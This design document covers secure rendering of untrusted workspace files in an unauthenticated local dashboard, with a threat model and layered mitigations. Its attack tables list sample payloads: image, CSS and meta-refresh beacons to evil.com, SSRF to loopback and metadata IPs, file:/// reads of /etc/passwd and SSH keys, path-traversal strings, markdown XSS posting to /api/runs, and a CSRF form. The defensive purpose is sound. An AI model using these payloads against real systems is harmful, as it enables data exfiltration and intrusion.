# Dashboard file preview — HLD/LLD (E-Fp7Qv2)

**Status:** **Implemented, reviewed, security-audited, and re-verified** (branch
`ad/workflow-templates`) · **Date:** 2026-07-30
**ADR:** [ADR-0011](adr/ADR-0011-untrusted-workspace-content-rendering.md)
**Builds on:** [ADR-0010](adr/ADR-0010-dashboard-architecture-and-general-instructions.md) ·
[`dashboard-and-general-instructions-hld.md`](dashboard-and-general-instructions-hld.md) §2.3 (file browsing), §2.7 (deferred security posture)
**Sibling epic:** `E-Bi5Nw8-dual-flavor-install` (unrelated scope, same branch)

The dashboard can already list and read files, but the viewer pane shows one thing: plain
monospace text (or a metadata banner for binaries). This epic makes it a real viewer —
markdown rendered, code highlighted, images shown, HTML/SVG previewed, typography
adjustable.

Rendering *is* the feature, and rendering untrusted content in a privileged origin is how
dashboards get owned. So the security model is not an appendix to this design; it is the
design. §1 states the threat model, §2 enumerates the attack classes with the specific
mitigation adopted for each, and §3–§8 are the component design that falls out of them.

---

## 1. Threat model

Three facts about this system, each independently true today, combine into the constraint
that shapes everything below.

### 1.1 Workspace file content is attacker-controlled

The workspace is **where AI agents write files**. Agents act on prompts that may themselves
be untrusted, they fetch and paste from the network, and the benchmark tiers
(`E-Bt4Xk9`) **import third-party repositories — SWE-bench instances — directly into the
workspace**. A `.html`, `.svg`, or `.md` file under a dashboard root is therefore not
"the user's own file." It is bytes of unknown provenance that arrived without review.

We do not get to assume otherwise, and we do not get to rely on the user noticing. The
whole point of the viewer is to look at files *before* you trust them.

### 1.2 The dashboard origin is a privileged origin

Per ADR-0010 D7, `ao ui` ships **no authentication** in this release. Anything running in
the dashboard's origin can, with a same-origin `fetch`, do everything the dashboard's API
does:

| Endpoint reachable from the origin | What it grants |
|---|---|
| `GET /api/files?path=&root=` + `GET /api/files/content` | Read any file under any configured root — source, `.git/`, `.ao/config.yaml`, credentials that happen to live there |
| `POST /api/runs` | **Launch a run** — arbitrary agent execution against the workspace, i.e. remote code execution *and* unbounded token spend |
| `POST /api/runs/{id}/resume`, `/cancel`, `DELETE /api/runs/{id}` | Disrupt or destroy in-flight work and its audit trail |

So `POST /api/runs` is an RCE-and-spend primitive, and it is protected by nothing but the
attacker's inability to reach the origin. **One line of JavaScript executing in the
dashboard origin is a full compromise of the workspace and of the user's API budget.**

### 1.3 There is no "safe" middle ground for exfiltration

Even without script execution, any outbound request from previewed content is an
exfiltration channel: the attacker learns the file rendered, and can encode data in the
URL. And because the fetch originates from the user's browser, it can reach hosts the
attacker cannot — the loopback interface, the LAN, cloud metadata endpoints.

### 1.4 The three invariants

Everything in §2 onward is a consequence of these:

> **I1 — Previewed content never executes in the dashboard origin.**
> Not "is sanitized so its script is harmless." Does not execute. The boundary is an
> opaque origin, and sanitization is the second layer, not the first.
>
> **I2 — Previewed content has no network egress channel.**
> No `http(s)` reference of any kind survives into rendered output. Not in `src`, not in
> `href`, not in CSS `url()`, not in `@import`, not in a `meta refresh`. The only URL
> scheme that reaches the browser is `data:`.
>
> **I3 — Sanitization is server-side and authoritative.**
> The client's DOMPurify pass and the iframe `sandbox` attribute are defence in depth. If
> either were the *only* guard, a bug in the frontend build, a stale cached bundle, or a
> future refactor that renders server HTML through a different path would be a full
> compromise. The server never emits markup it would be unsafe to render.

---

## 2. Attack classes and adopted mitigations

Each row is a concrete attack against *this* design, not a generic OWASP category. The
"Mitigation" column is what we actually build; the "Pinned by" column is the test that
must fail if the mitigation regresses.

### 2.1 Same-origin script execution

**Attack.** A workspace `report.html` contains `<script>fetch('/api/runs',{method:'POST',
body:...})</script>`. The user clicks it in the file browser. If the dashboard injects that
HTML into its own DOM — `innerHTML`, `dangerouslySetInnerHTML`, an iframe with
`allow-same-origin`, or a `<div>` with the file's text — the script runs with the origin's
full authority (§1.2).

**Mitigation — three independent layers, any one of which suffices:**

1. **Server strips it.** `script` (and `iframe`, `frame`, `frameset`, `object`, `embed`,
   `applet`, `base`, `form`, `noscript`) are dropped **with their entire subtree** by a
   parser-based allowlist serializer (§4.2). Every `on*` attribute is dropped. The count
   is reported as `scripts_removed` rather than silently swallowed.
2. **The render target is an opaque origin.** The client renders into
   `<iframe sandbox="" srcDoc={...}>`. With `allow-same-origin` absent, the frame gets an
   **opaque origin** — it is same-origin with nothing, including itself. Even if a script
   survived stripping, `allow-scripts` is absent so it does not run; and even if it ran, it
   could not read the dashboard's cookies, DOM, or `localStorage`, and a same-origin
   `fetch('/api/runs')` would be a cross-origin request from an opaque origin.
3. **Frame-level CSP.** The server-generated document carries
   `<meta http-equiv="Content-Security-Policy" content="... script-src 'none' ...">`.

**Why three.** Layer 1 is a hand-written sanitizer; sanitizers have bugs. Layer 2 is a
browser primitive and is the *actual* boundary. Layer 3 costs one tag.

**Pinned by.** `test_htmlpreview.py`: `<script>` removed and counted; `onerror=`/`onload=`
stripped; comment-smuggled markup dropped. `ui/src/test/`: the iframe has neither
`allow-same-origin` nor `allow-scripts` by default.

### 2.2 No-script exfiltration (img / CSS / font / meta-refresh)

**Attack.** Scripts are the obvious channel and the easy one to block. These are not:

| Vector | Payload |
|---|---|
| Image beacon | `<img src="https://evil.com/?t=1">` — fires on render, no user action |
| CSS background | `<style>body{background:url(https://evil.com/?t=1)}</style>` |
| CSS `@import` | `@import url(https://evil.com/x.css)` — and the imported sheet can chain further |
| Webfont | `@font-face{src:url(https://evil.com/f.woff)}` |
| Meta refresh | `<meta http-equiv="refresh" content="0;url=https://evil.com/">` |
| Prefetch/preload | `<link rel="prefetch" href="https://evil.com/">` |
| Form action | `<form action="https://evil.com">` + autofocus/submit tricks |
| `srcset` | `<img srcset="https://evil.com/x.png 1x">` — a second URL surface behind `src` |

None of these need JavaScript. Several fire with zero interaction. The sandbox does **not**
block them — `sandbox=""` restricts scripts, forms, origin, and navigation *of other
browsing contexts*. It does not restrict subresource loads, and it does **not** stop the
framed document from navigating **itself** (see §2.2.1). Egress therefore has to be closed
in the sanitizer, not delegated to the sandbox.

**Mitigation — scheme allowlist, not a blocklist (I2).** Every URL the sanitizer processes
survives **only if its scheme is `data:`**. Everything else is dropped and recorded:
`http`/`https` → reason `external`; `file`, `javascript`, `vbscript`, `blob`,
protocol-relative `//host`, backslash-relative `\\host`, and anything unrecognized →
`unsupported-scheme`. There is no "trusted external host" list, because I2 admits no
exceptions.

Specifically:
- `meta` is dropped entirely **unless** it is a harmless `charset` declaration — which kills
  `meta refresh` and `meta http-equiv` CSP-override attempts in one rule rather than
  enumerating dangerous `http-equiv` values.
- `link` is dropped **except** `rel="stylesheet"` with an in-root `href`, whose CSS is
  inlined into a `<style>` block and processed by the same CSS rules. That kills
  `prefetch`/`preload`/`dns-prefetch`/`prerender` without special-casing each.
- `form` is dropped as an element; `action` and `formaction` are dropped as attributes.
- `srcset` is on the processed-URL allowlist, so each of its candidate URLs goes through the
  same scheme check as `src`.
- CSS `url()` values are rewritten through the identical URL pipeline, in both `<style>`
  blocks and inline `style` attributes.
- The frame CSP is `default-src 'none'; img-src data:; style-src 'unsafe-inline' data:;
  font-src data:; script-src 'none'; connect-src 'none'; form-action 'none'; base-uri
  'none'` — belt and braces: even a URL the sanitizer somehow missed cannot load, because no
  scheme but `data:` is permitted for any resource type and `connect-src 'none'` forbids
  the fetch/XHR/WebSocket/beacon family outright.

**Pinned by.** `test_htmlpreview.py`: `http://evil.com/x.png` dropped as `external`; CSS
`url()` rewritten; `@import` handling; `expression(` stripped.

#### 2.2.1 Navigation is NOT contained by the sandbox or by CSP — correction of a false premise

This document previously justified stripping `<a href>` with "the sandbox blocks navigation
anyway." **That is false, and an adversarial audit proved it** (§10, finding H1). It is
recorded here rather than quietly deleted because it is the reasoning that let a real hole go
unnoticed, and because it is an easy and attractive mistake to make again.

Two precise facts:

1. **A sandboxed iframe can always navigate *itself*.** `sandbox` (without
   `allow-top-navigation`) restricts navigating **other** browsing contexts — the top frame,
   siblings, named windows. The framed document navigating its *own* context is not
   sandboxable and never has been. So a live `href` inside `sandbox=""` is a genuine
   one-click egress and malicious-redirect channel, not "dead UI."
2. **No CSP directive stops navigation.** `connect-src`, `img-src`, and friends govern
   *subresource fetches*. A top-level navigation of the frame is not a subresource fetch, and
   there is no directive that forbids it. (`form-action` covers form submission only;
   `frame-src` governs which documents may be *embedded*, not where an already-embedded
   document may go.) So layer 3 does not cover this either.

**Consequence, and it is the load-bearing one:** navigation is the one attack class where
**all three layers of the defence stack are silent** — the sandbox permits self-navigation,
CSP has no applicable directive, and the opaque origin makes the navigation harmless to *us*
but does nothing to stop the request leaving. It therefore **must** be closed in the
sanitizer, which is why `<a href>` stripping is a real control (not merely cosmetic) and why
SVG SMIL animation elements had to be dropped outright (§10, H1). Anything that can set or
retarget a URL-bearing attribute at render time is an egress channel.

The corrected rationale for `<a href>` stripping is in §4.2's rule table and mirrored at the
call site in `htmlpreview.py`.

### 2.3 SSRF and local-file reads

**Attack.** Two shapes, and they are worth separating because the mitigations differ.

*Browser-side SSRF.* `<img src="http://127.0.0.1:9200/_cluster/health">` or
`<img src="http://169.254.169.254/latest/meta-data/">`. The request originates from the
user's browser, on the user's network, so it reaches services no external attacker can. A
same-origin-ish request to another local port can trigger state-changing GETs on unprotected
dev services. Combined with a timing or error-based oracle this becomes a local port scan.

*Server-side SSRF.* If the backend resolved and fetched refs itself, `<img
src="http://internal-service/">` would make the **dashboard process** the requesting client
— worse, because it is a long-lived server-side identity, not a browser subject to CORS.

*Local file read.* `<img src="file:///etc/passwd">`, `<link rel="stylesheet"
href="file:///home/user/.ssh/id_rsa">`, or `<iframe src="file:///">`.

**Mitigation.**
- Browser-side: same scheme allowlist as §2.2 — no `http`, `https`, or `file` URL ever
  reaches the browser, so there is no request to make. `connect-src 'none'` and
  `default-src 'none'` in the frame CSP are the backstop.
- Server-side: **the backend never performs a network fetch.** The inliner resolves refs
  only against the local filesystem, and only inside the configured root (§2.4). There is
  no HTTP client in `htmlpreview.py`. This is a structural property, not a check that could
  be bypassed.
- `file:` is not special-cased; it falls out of "scheme is not `data:`" and is recorded
  `unsupported-scheme`.

**Pinned by.** `test_htmlpreview.py`: `file:` and protocol-relative URLs dropped.

### 2.4 Path traversal and symlink escape

**Attack.** The inliner's job is to turn a relative ref into file bytes, which makes it a
file-read primitive aimed at the server's filesystem. Every classic escape applies:

| Payload | Trick |
|---|---|
| `<img src="../../../../etc/passwd">` | Plain traversal |
| `<img src="%2e%2e%2f%2e%2e%2fetc/passwd">` | Percent-encoded, to slip a naive string check |
| `<img src="....//....//etc/passwd">` | Doubled-dot filter bypass |
| `<img src="/etc/passwd">` | Root-absolute, mistaken for "in-root absolute" |
| `<img src="secrets.png">` where `secrets.png` → `/etc/shadow` | **Symlink** — the path never contains `..` |
| `<img src="ok.png%00.txt">` | NUL truncation against a C-level path API |

And the same payloads apply directly to `?path=` on both `/api/files/content` and
`/api/files/html`.

**Mitigation — one guard, reused, that fails closed.** `FileBrowser.resolve` already
implements the containment rule the dashboard has relied on since E-Ui7Kq2: `Path.resolve()`
the candidate — which collapses `..` **and follows symlinks** — then prefix-check the
*resolved* path against the *resolved* root. A symlink pointing outside resolves to an
outside path and is refused; there is no `..` for a filter to miss because the check happens
after normalization, not before.

The inliner must use **that same guard**, not a second implementation:

1. Percent-decode the ref (once), then reject any ref still containing a NUL byte.
2. Resolve relative refs against **the HTML file's own directory** (not the root, not the
   process cwd) — that is what a browser would do, and getting it wrong either breaks valid
   documents or widens the reachable set.
3. Hand the result to the same resolve-then-prefix-check guard. Outside → drop with reason
   `outside-root`; missing → `not-found`.

**Why reuse and not reimplement.** Two path guards means two chances to be wrong and no
guarantee they agree; a future fix to one silently leaves the other exploitable. This is the
"extract shared logic rather than copy" rule in `CLAUDE.md` applied where the cost of
divergence is a file-read vulnerability. Same reasoning drives §5.3: the frontend resolves
markdown image refs by *calling the API*, so there is no third resolver in TypeScript.

**Pinned by.** `test_files.py` / `test_api_integration.py`: `../../etc/passwd`,
`%2e%2e%2f`, absolute `/etc/passwd`, and symlink-to-outside all return **403** on **both**
`/api/files/content` and `/api/files/html`. `test_htmlpreview.py`: `../` ref dropped as
`outside-root`.

### 2.5 Content-type sniffing and MIME confusion

**Attack.** `evil.png` whose bytes are `<html><script>…</script>`. If the backend trusts the
extension and emits `data:image/png;base64,<html…>`, a browser that sniffs may render it as
HTML. Conversely, if MIME were derived from *content* sniffing, an attacker controls the
sniff input and can steer it toward `text/html`. And if MIME were ever echoed from a request
parameter, the attacker sets it directly.

**Mitigation — two independent checks that must agree, plus `nosniff`:**

1. `kind == "image"` requires **extension in the allowlist AND magic bytes that confirm it**
   (`IMAGE_MAGIC_PREFIXES`). A `.png` containing HTML bytes fails the magic check and is
   **not** classified as an image — it falls through to `text`/`binary` classification and
   is displayed as what it is.
2. The MIME written into the `data:` URI comes from the **extension allowlist only**
   (`IMAGE_MIME_BY_EXT`) — never from content sniffing, never echoed from a request
   parameter. Sniffing decides *whether* a file is an image; the allowlist decides *what
   MIME string we emit*. Neither input alone controls the outcome.
3. `X-Content-Type-Options: nosniff` on **every** response, so a browser cannot override our
   declared type on any endpoint.

**Pinned by.** `test_files.py`: a `.png` containing HTML bytes is not classified as an image.

### 2.6 SVG-as-script

**Attack.** SVG *looks* like an image and is not one. It is an XML document that can carry
`<script>`, `<foreignObject>` with embedded HTML, `on*` event handlers, `<use xlink:href>`
pointing at external or local documents, and `<animate onbegin=…>`. An SVG inlined into an
`<img>` tag is comparatively inert, but an SVG rendered as a *document* — or inlined into
the page DOM, which is exactly what "show me this file" tempts you to do — executes.

**Mitigation.** **SVG is classified `markup`, never `image`.** `.svg` (with `.html`,
`.htm`, `.xhtml`) is in `MARKUP_EXTENSIONS`, so it routes through the full sanitize pipeline
(§4.2) and renders in the sandboxed iframe — the same treatment as a hostile HTML file, for
the same reason. It never gets a `data_uri` and never reaches an `<img>` tag or the page DOM.

The frontend reinforces this: `kind == "markup"` defaults to the **Source** tab, so viewing
a `.svg` shows its text and previewing it is a deliberate click.

Additionally, `xlink:href` is on the dropped-attribute list, which neutralizes `<use>`-based
external references independent of the scheme check.

**Pinned by.** `test_files.py` / `test_htmlpreview.py`: an SVG containing `<script>` is
classified `markup` and the script is removed.

### 2.7 Markdown XSS

**Attack.** Markdown is not a safe subset of HTML; it is a *superset* by way of raw
passthrough. All of these are valid markdown:

```markdown
<script>fetch('/api/runs',{method:'POST',body:'…'})</script>
[click me](javascript:fetch('/api/runs',{method:'POST'}))
<img src=x onerror="fetch('/api/runs',{method:'POST'})">
[ref][1]

[1]: javascript:alert(1)
<div onmouseover="…">hover</div>
![img](https://evil.com/beacon.png)
```

And unlike HTML preview, markdown is rendered **in the dashboard origin** — that is the
point of markdown, you want the app's typography and working links. So there is no opaque
origin to hide behind here. The sanitizer *is* the boundary.

**Mitigation.**
- `marked` → **`DOMPurify.sanitize` with an explicit tag/attribute allowlist**, and
  `ALLOWED_URI_REGEXP` restricted to `http`, `https`, `mailto`, and relative. DOMPurify is
  non-negotiable and is not configured in "allow everything, block the bad" mode. That kills
  `javascript:` in links (including the reference-definition form), raw `<script>`, and
  `on*` handlers together.
- External links get `target="_blank"` + `rel="noopener noreferrer"` — no `window.opener`
  handle back into the dashboard, no referrer leak of the workspace path.
- **Relative image refs are resolved through `GET /api/files/content`** and substituted with
  the returned `data_uri` (capped at `MARKDOWN_MAX_IMAGES = 50`). This reuses the server's
  containment guard (§2.4) instead of building a second path resolver in the client. A ref
  that 403s or 404s renders as a broken-image note — **never** as a raw URL pointing
  somewhere else, which would convert a failed local read into an outbound request.
- Absolute `http(s)` image refs are a deliberate, narrower exception than the HTML path:
  markdown renders in the app origin under the SPA CSP, where `img-src 'self' data:`
  blocks them at the browser. Documented here so it is not mistaken for an oversight —
  the CSP, not the sanitizer, is what enforces it, and §7 requires verifying that
  empirically.

**Pinned by.** `ui/src/test/`: markdown `<script>`, `javascript:` links, and `<img onerror>`
are all sanitized away.

### 2.8 Highlighter ReDoS / render DoS

**Attack.** Syntax highlighters are regex engines pointed at attacker-controlled input.
A pathological file — a 50 MB single line, deeply nested brackets, a string that never
terminates — can drive catastrophic backtracking and **hang the browser tab**, taking the
dashboard down with it. This is a denial of service on the operator's only window into
their runs. `highlight.js` makes no ReDoS guarantee, and workspace files are untrusted
(§1.1).

**Mitigation.**
- **Cap highlighting at `HIGHLIGHT_MAX_BYTES = 256_000`.** Past that, render plain text with
  a visible note. A byte cap is a hard bound that does not depend on reasoning about any
  particular grammar's worst case.
- `hljs.highlight(code, { language, ignoreIllegals: true })` with a **curated language
  subset** (§5.2) — fewer registered grammars is both a smaller bundle and a smaller attack
  surface. Unknown language → plain text, never a guess-and-scan over every grammar.
- Server side, source reads are bounded by the existing `MAX_READ_BYTES` (1 MB) with
  `truncated=True` reported honestly, so the frontend never receives an unbounded payload
  in the first place.
- `hljs` escapes its own input, so `dangerouslySetInnerHTML` on **its output** is
  acceptable — with a comment saying exactly that, and with raw file text never
  concatenated into that HTML by us. The distinction between "HTML from a component that
  escapes" and "HTML containing raw file bytes" is the entire safety argument, so it is
  written down at the call site rather than left to be rediscovered.

**Pinned by.** `ui/src/test/`: highlighting applied below the cap, plain text past it.

### 2.9 The `allow-scripts` + `allow-same-origin` sandbox-defeat trap

**Attack.** This one is a trap for *us*, not an attack on a user, and it deserves its own
row because it is the single most likely way this design gets silently broken later.

`sandbox="allow-scripts allow-same-origin"` **defeats the sandbox entirely.** With both
flags, framed content runs script *in the parent's origin* and can reach up and remove the
`sandbox` attribute from its own iframe element, then reload. The sandbox becomes
decorative. It reads like "two safe-sounding relaxations" and it is a full origin
compromise.

The realistic path: someone previews an HTML file with interactive charts, the charts do not
work, they add `allow-scripts`; something else does not work, they add `allow-same-origin`
because it sounds like a scoping fix. Neither change looks alarming in review.

**Mitigation.**
- Default is `sandbox=""` — the opaque origin (§2.1 layer 2).
- **A comment at the iframe stating that the two flags together defeat the sandbox**, so the
  next person to touch it is told before they change it. This is a real deliverable, not a
  nicety: the code comment is the control.
- A test asserts the rendered iframe has **neither** `allow-same-origin` **nor**
  `allow-scripts` by default, so the combination cannot be introduced silently.
- The optional per-file "enable scripts" toggle, **if** shipped, is `sandbox="allow-scripts"`
  only — never with `allow-same-origin` — off by default and reset on file change. The
  contract's guidance stands: if the implementer is not confident, **omit it**. A half-safe
  version is worse than no feature, because it advertises safety it does not have.

**Pinned by.** `ui/src/test/`: iframe sandbox attribute assertions.

### 2.10 CSRF and DNS rebinding

**Attack.** This closes a **pre-existing critical gap** — it is not introduced by the
preview feature, and would be worth fixing on its own. Today the dashboard validates neither
`Origin` nor `Host`.

*CSRF.* Any website the user visits while `ao ui` runs can:
```html
<form action="http://127.0.0.1:8765/api/runs" method="POST"
      enctype="text/plain"><input name="…"></form><script>form.submit()</script>
```
No same-origin read is needed. Firing `POST /api/runs` blind is enough — it is RCE and spend
(§1.2). Loopback binding does not help: the *browser* is on loopback.

*DNS rebinding.* A page on `attacker.com` whose DNS record has a 1-second TTL and rebinds to
`127.0.0.1`. The browser then treats requests to `http://attacker.com:8765/` as same-origin
with the attacker's page — so CORS, the same-origin policy, and `Origin` checks all pass
legitimately. The attacker gets full **read and write**: every file under every root, plus
run control.

**Mitigation — layered, in `ui/security.py`, applied in `create_app`:**

| # | Control | Rejects with | Stops |
|---|---|---|---|
| 1 | **`Host` allowlist** — `localhost`, `127.0.0.1`, `[::1]`, `::1` (any port), plus the host `ao ui` actually bound to; `AO_UI_ALLOWED_HOSTS` to configure, literal `*` disables with a loud startup warning | **421 Misdirected Request** | **DNS rebinding.** The rebound request still carries `Host: attacker.com`, which is not in the allowlist. This is the control that matters — an `Origin` check alone does not stop rebinding, because after rebinding the origin genuinely matches. |
| 2 | **`Origin` check on `POST`/`PUT`/`PATCH`/`DELETE`** — if present, must match an allowed origin | **403** | Classic cross-site CSRF. Absent `Origin` is **allowed**: curl, the CLI, and the test client are legitimate non-browser callers, and browsers always send `Origin` on cross-origin mutating requests — so CSRF stays blocked without breaking scripted use. |
| 3 | **`Content-Type: application/json` required on mutating routes that carry a body** (`Content-Length` present and nonzero, or chunked transfer-encoding) — bodyless mutating requests (e.g. `POST /api/runs/{id}/resume`, `DELETE /api/runs/{id}` with no payload) are exempt | **415** | `<form>`-based CSRF specifically. An HTML form can only send `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` — it *cannot* set `application/json`. This blocks the no-JS, no-CORS-preflight form-POST path even where `Origin` is somehow absent. |
| 4 | **Response headers on every response** — `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin` | — | MIME sniffing (§2.5); workspace paths leaking via `Referer`; cross-origin `window.opener` reach-in; cross-origin subresource inclusion of API responses |
| 5 | **CSP on the SPA document** (the `/` and SPA-fallback HTML responses only, not JSON) | — | Whole-app fallback: even a successful markdown-sanitizer bypass has no egress, since `connect-src 'self'` and `img-src 'self' data:` forbid outbound requests, and `object-src 'none'`/`base-uri 'none'`/`form-action 'none'` close the plugin, base-tag, and form paths |

The bodyless exemption in row 3 is safe: there is no payload to smuggle via a spoofed
content type, and a browser cannot produce a cross-origin state-changing request without
sending an `Origin` header, so layer 2 already covers the cross-origin case for these
routes regardless of body.

Layers 2 and 3 are deliberately redundant: each covers a case the other does not, and
together they cover browser-initiated mutation without breaking non-browser clients.

**`ao ui` integration.** The command passes its bound host into the allowlist, and
**extends** its existing off-loopback warning rather than adding a second one.

**Pinned by.** `test_security.py` / `test_api_integration.py`: bad `Host` → 421;
cross-origin `POST` → 403; absent `Origin` `POST` → allowed; `Content-Type: text/plain`
`POST` → 415; `AO_UI_ALLOWED_HOSTS=*` disables the check.

> **Test-fixture note, called out because it is a real footgun.** Starlette's `TestClient`
> sends `Host: testserver`, which the allowlist rejects. The fixture must set allowed hosts
> in **one** place (`tests/ui/conftest.py`) — and there must be explicit tests that assert
> the check *does* reject, so a blanket fixture cannot quietly disable the control across the
> whole suite. A security control that every test opts out of is not a control.

### 2.11 Residual risks (accepted, documented)

Honesty about what this design does *not* stop:

| Residual risk | Why accepted |
|---|---|
| **Still no authentication.** Anything that reaches the origin — a local process, another user on a shared box, an operator who binds `0.0.0.0` — has full access. | Out of scope per ADR-0010 D7. This epic *narrows* the ways content can reach the origin; it does not add auth. Auth remains the top roadmap item ([`meta/ROADMAP.md`](../meta/ROADMAP.md) §3.1). |
| **Rendered-content phishing.** Previewed HTML can *look* like a dashboard dialog and ask for a token. | Inherent to previewing content at all. Partially mitigated: the iframe is visually contained and cannot navigate the **top** frame (no `allow-top-navigation`), and `href` stripping plus dropping SMIL retargeting elements removes the click-to-elsewhere channels. Note the frame *can* still navigate **itself** (§2.2.1) — contained to the frame, but it means "the sandbox stops navigation" is never a safe assumption. |
| **A sanitizer bug in a browser-specific parsing quirk.** | Why I1 exists: the opaque origin means a sanitizer miss is a rendering bug, not a compromise. |
| **Resource exhaustion by many large inlined assets.** | Bounded by `HTML_INLINE_BUDGET_BYTES`, `HTML_ASSET_MAX_BYTES`, `MAX_READ_BYTES`, `HIGHLIGHT_MAX_BYTES`, `MARKDOWN_MAX_IMAGES` — every ingestion path has a named cap. |
| **Base64 inflation.** A `data:` URI is ~1.37× the source bytes, so a 10 MB budget is ~13.7 MB of response. | Accepted; the budget is on source bytes and is deliberately well under a size that would wedge a browser. |

---

## 3. Why inline + sandbox, and not a raw-bytes proxy endpoint

This is the central architectural decision, recorded in
[ADR-0011](adr/ADR-0011-untrusted-workspace-content-rendering.md).

### 3.1 The rejected alternative

The obvious design: add `GET /api/files/raw?path=` that streams file bytes with a guessed
`Content-Type`, then point the preview iframe at it (`src="/api/files/raw?path=report.html"`)
and let relative refs resolve naturally as further requests to the same endpoint. Almost no
sanitizer needed; relative paths, CSS, and fonts all just work.

### 3.2 Why it was rejected

**It re-creates a live egress channel, which is the thing I2 exists to prevent.** Once
framed content can issue requests that the browser resolves, every relative ref is a live
request. Serving those from *our* origin is worse than an external fetch, not better: the
content is now making authenticated-by-locality requests to the privileged API surface
(§1.2). Path containment on each request bounds *which files* leak, but the channel itself —
request timing, request presence, data encoded in the path — is open. A sandboxed frame
loading a subresource from our origin is exactly the shape we are trying to eliminate.

**It puts a permanent raw-bytes endpoint on the attack surface.** `/api/files/raw` would be
a general-purpose "serve any workspace file with a content type" primitive, reachable by
anything that can reach the origin, forever — long after this feature's UI changes. Its
safety would then rest on getting `Content-Type` right for every file type, plus `nosniff`,
plus `Content-Disposition`, plus never letting a sandbox-relaxing change land upstream of
it. That is a lot of ongoing correctness to owe, for a convenience.

**A `srcdoc` document is strictly easier to reason about.** `srcdoc` + `sandbox=""` yields an
opaque origin with no base URL, so a relative ref has nothing to resolve *against*. The
absence of a resolution target is a structural guarantee, not a check. The security argument
becomes: "the only bytes in the frame are bytes the server decided to put there, and the only
scheme present is `data:`." That is a sentence you can verify by reading one function.

**Provenance becomes reportable.** Because the server does the resolution, it knows exactly
what it dropped and why — so the UI can show `scripts_removed`, `inlined`, and the `dropped`
list grouped by reason. With a proxy, drops happen invisibly in the browser's network layer.
The user asked for containment; they should be able to see what was contained. (Dropped URLs
render as **text, never links** — otherwise the provenance panel becomes the egress channel
the design just closed.)

### 3.3 The tradeoff we accept

**Inlining means the whole preview must fit in a budget.**

| Constant | Value | Meaning |
|---|---|---|
| `HTML_INLINE_BUDGET_BYTES` | 10,000,000 | Total across all inlined assets for one preview |
| `HTML_ASSET_MAX_BYTES` | 5,000,000 | Per single asset |
| `HTML_MAX_IMPORT_DEPTH` | 3 | `@import` nesting |
| `MAX_READ_BYTES` | 1,000,000 (existing) | Source HTML read bound |

Consequences, stated plainly:

- An asset-heavy document (a big report with many screenshots) will have some assets
  dropped as `too-large` or `budget-exhausted`. The preview is then *incomplete* — visibly
  so, which is the point: the `dropped` panel names every omission with a reason, rather
  than showing a silently broken layout.
- Response bodies are larger than a proxy's, and ~1.37× the inlined source bytes after
  base64. For a local-first dashboard on loopback, response size is cheap and this is a good
  trade.
- **A budget is never spent partially on one asset.** Exceeding a cap drops the ref whole; we
  never truncate mid-stream. A half-written PNG is worse than a missing one — it renders as
  a corrupt image, which reads as a bug in the dashboard rather than as a deliberate
  omission.
- Video and other genuinely large media are effectively not previewable. Accepted; out of
  scope.

**If the budget proves too tight in practice**, the fix is to raise the constants (they are
named, in one place, exactly so) — *not* to add a raw endpoint. That would trade a
quantitative limit for a qualitative loss of the egress guarantee.

---

## 4. Backend design

### 4.1 `GET /api/files/content` — classification (1A.1)

Additive only. Every existing field (`is_binary`, `text`, `truncated`, …) keeps its meaning,
because the current frontend and the existing `tests/ui/*` depend on them.

```python
kind: str            # "text" | "image" | "markup" | "binary"
mime: str | None     # allowlisted MIME when kind == "image", else None
data_uri: str | None # set ONLY when kind == "image" and size <= IMAGE_INLINE_MAX_BYTES
```

Classification, in order:

| Order | `kind` | Rule |
|---|---|---|
| 1 | `image` | extension in `IMAGE_MIME_BY_EXT` (`png, jpg, jpeg, gif, webp, bmp, ico`) **AND** magic bytes in `IMAGE_MAGIC_PREFIXES` confirm it (§2.5) |
| 2 | `markup` | extension in `MARKUP_EXTENSIONS` (`.html`, `.htm`, `.svg`, `.xhtml`) — **SVG lands here, never in `image`** (§2.6) |
| 3 | `binary` | NUL byte in the sniff block and not a recognized image |
| 4 | `text` | everything else |

`data_uri` is `data:<mime>;base64,<…>`, with `<mime>` from the extension allowlist only.
Over `IMAGE_INLINE_MAX_BYTES = 5_000_000` → `data_uri is None`, and the frontend shows size
plus reason instead of a broken image.

Named constants only, no magic literals: `IMAGE_INLINE_MAX_BYTES`, `IMAGE_MIME_BY_EXT`,
`IMAGE_MAGIC_PREFIXES`, `MARKUP_EXTENSIONS`.

### 4.2 `GET /api/files/html` — sanitize + inline (1A.2)

New module `ui/htmlpreview.py`. Output is HTML safe to drop into an `iframe srcdoc`.

```python
@dataclass(frozen=True)
class DroppedRef:
    url: str      # original ref, TRUNCATED to 200 chars for display safety
    reason: str   # "external" | "outside-root" | "not-found" | "too-large"
                  # | "budget-exhausted" | "unsupported-scheme" | "depth-exceeded"

@dataclass(frozen=True)
class HtmlPreview:
    path: str
    root: str
    html: str                    # sanitized, self-contained
    inlined: int
    dropped: list[DroppedRef]
    scripts_removed: int
    truncated: bool              # source exceeded MAX_READ_BYTES
    budget_bytes: int
    budget_used: int
```

Two non-negotiables, both of which have bitten this repo or its neighbours before:

**Parse, don't regex.** Use stdlib `html.parser.HTMLParser` and **re-serialize from an
allowlist** — no new dependency. Regex tag-stripping is trivially bypassed:
`<scr<script>ipt>` (nested-tag reassembly), unquoted/malformed attributes, comment tricks,
`<svg/onload=…>` with no whitespace. An allowlist serializer is safe by construction — an
element or attribute we did not explicitly decide to emit does not appear in the output. A
blocklist is a bet that we enumerated every dangerous name; an allowlist is a bet that we
enumerated every *safe* one, and being wrong there costs a missing tag, not a compromise.

**Escape on re-serialize.** All text and attribute values go through
`html.escape(..., quote=True)` on the way out, and attribute values are **always
double-quoted**. This is the exact bug class already recorded in
[`meta/learnings.md`](../meta/learnings.md) under "template render escaping/containment" —
the sanitizer can be perfect about *which* nodes it keeps and still reintroduce live markup
by writing a kept node's text back out raw.

| Rule group | Behaviour |
|---|---|
| Elements dropped **with subtree** | `script`, `iframe`, `frame`, `frameset`, `object`, `embed`, `applet`, `base`, `form`, `noscript` |
| Comments | Dropped (IE conditional comments smuggle markup) |
| `meta` | Dropped unless a harmless `charset` (§2.2) |
| `link` | Dropped, except `rel="stylesheet"` resolving in-root → inline CSS into `<style>`, processed per CSS rules |
| Event handlers | Every `on*` dropped, case-insensitive, **after** whitespace/control-char stripping |
